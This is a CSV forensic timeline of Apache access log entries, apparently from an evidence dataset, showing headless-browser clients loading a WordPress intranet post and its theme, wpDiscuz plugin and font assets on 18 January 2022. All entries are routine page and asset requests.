01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11600; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 10846; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10....,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4505; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31246; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1098; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:42,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-cron.php?doing_wp_cron=1642510362.7998480796813964843750 HTTP/1.1 fr...,http_request: POST /wp-cron.php?doing_wp_cron=1642510362.7998480796813964843750 HTTP/1.1 from: 10.35.35.206 code: 200 user_agent: WordPress/5.8.3; https://intranet.price.fox.org,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 150; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5265; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:52:51,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:56,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 10.35.33.144,http_request: GET /?p=5 HTTP/1.1 from: 10.35.33.144 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 40142; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 ...,http_request: GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6799; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HT...,http_request: GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 71266; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/f...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3464; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-brands-400.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 76991; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-regular-400.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 13874; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-solid-900.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 79823; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.wof...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.woff2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 18908; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 ...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 20302; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1511; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23299; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11687; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11510; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144,http_request: GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1702; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10....,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4570; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.144,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31377; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1120; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:56:57,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5331; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:57:20,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /?p=5 HTTP/1.1 from: 10.35.33.116,http_request: GET /?p=5 HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 40100; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 ...,http_request: GET /wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6799; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/f...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 2888; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 ...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 20302; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1511; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23299; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11510; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10....,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 7567; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31377; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5331; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HT...,http_request: GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 71266; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-brands-400.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 76991; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-regular-400.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 13874; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-solid-900.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 79823; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
